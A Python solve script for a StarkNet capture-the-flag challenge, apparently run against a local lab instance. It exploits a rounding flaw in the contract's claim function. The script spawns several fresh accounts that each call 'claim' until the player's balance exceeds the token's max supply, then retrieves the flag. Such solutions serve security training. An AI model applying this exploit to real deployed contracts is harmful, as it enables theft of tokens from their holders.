import asyncio
import logging

from starknet_py.contract import Contract
from starknet_py.net import AccountClient
from starknet_py.net.gateway_client import GatewayClient
from starknet_py.net.models import StarknetChainId

from common import utils

logger = utils.setup_logger("first-come-first-served")

async def main(hostname='127.0.0.1', port=31337):
    ctx = await utils.get_context(hostname, port)
    contract = ctx["contract"]
    acc_client = ctx["acc_client"]
    contract_address = ctx["contract_address"]
    
    max_supply = (await contract.functions["get_max_supply"].call()).supply
    # find number of shares providing a float result
    for nb_shares in range(2, 30):
        if (max_supply % nb_shares) != 0:
            break
    
    # attack
    for i in range(2, nb_shares):
        logger.debug(f"Shares {i}")
            # attack
        aclient = await AccountClient.create_account(
            acc_client.client,
            chain=StarknetChainId.TESTNET,
        )
        acontract = await Contract.from_address(contract_address, aclient) 
        logger.debug(f"Invoke claim")
        invocation = await acontract.functions["claim"].invoke(max_fee=int(0))
        await invocation.wait_for_acceptance()
        balance = (await acontract.functions["get_balance"].call(claimer=aclient.address)).balance
        logger.debug(f"Balance: {balance}")
        logger.debug(f"Gotcha?: {int(balance) > int(max_supply)}")
    
    logger.debug("Player invoke claim")
    invocation = await contract.functions["claim"].invoke(max_fee=int(4e16))
    await invocation.wait_for_acceptance()
    balance = (await contract.functions["get_balance"].call(claimer=acc_client.address)).balance
    logger.info(f"Player balance: {balance}")
    logger.info(f"Player Gotcha?: {int(balance) > int(max_supply)}")

    flag = utils.get_flag(hostname, port)
    logger.info(f"Flag: {flag}")
    return

asyncio.run(main())
